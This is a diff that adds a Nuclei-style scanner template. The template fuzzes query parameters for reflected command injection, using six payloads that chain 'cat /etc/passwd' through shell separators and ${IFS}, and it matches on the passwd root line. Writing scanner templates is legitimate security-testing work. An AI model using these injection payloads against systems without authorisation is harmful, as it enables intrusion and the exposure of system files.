@@ -1,0 +1,35 @@
+id: jaeles-signatures-rce
+
+info:
+  name: Reflected RCE Jaeles
+  author: reewardius
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      rce:
+        - '&&${IFS}cat${IFS}/etc/passwd'
+        - '&${IFS}cat${IFS}/etc/passwd&'
+        - '&&${IFS}cat${IFS}/etc/passwd&&'
+        - '||${IFS}cat${IFS}/etc/passwd'
+        - '||${IFS}cat${IFS}/etc/passwd||'
+        - ';${IFS}cat${IFS}/etc/passwd'
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        part: body
